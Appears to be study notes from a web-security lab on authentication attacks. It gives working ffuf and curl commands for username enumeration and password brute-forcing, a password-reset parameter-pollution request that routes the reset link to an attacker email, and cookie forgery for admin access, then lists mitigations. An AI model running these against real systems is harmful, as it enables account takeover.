## Username Enumeration
Using ffuf:

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http:/website.com/signup -mr "username already exists"
```

## Brute Force a Login Form
Using ffuf (if invalid -> 200, valid -> 302 redirect):

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://website.com/login -fc 200
```

## Logic Flaws
- case insensitive parameter:
  `/adMin` could be interpreted as `/admin` by the handler.
- Parameter pollution in password reset:
  Password reset `/reset` could implements a two-step workflow:
	- accept an email addres, and if matches a known account,
	- accepts the username associated with that email and, on success, sens a password reset link to the email on file.
	This could be exploited with something like :
	`curl 'http://website.com/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`

```
curl 'http://website.com/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
```

## Cookie Manipulation
- Could have plain text cookie:

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

```bash
curl -H "Cookie: logged_in=true; admin=false" http://10.65.137.235/cookie-test
```

```bash
curl -H "Cookie: logged_in=true; admin=true" http://10.65.137.235/cookie-test
```

- For encoded cookies, we can try encoding it. Examples:

```bash
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```

Decoding the value with base64 produces `{"id":1,"admin":false}`. Just change it to `"admin":true`.

## Mitigations:
- Username Enumeration:
	- Rate limiting captchas
	- returning indistinguishable responses for registered and unregistered values on every authentication-related endpoint.
- Brute Force:
	- rate limiting
	- account lockout after a threshold number of failed attempts
	- MFA
	- enforce password policies
- Logic Flaws:
	- every security-relevant decision should read its inputs from a single, trusted source.
- Cookie Tampering:
	- Sign session tokens with a strong server-side secret.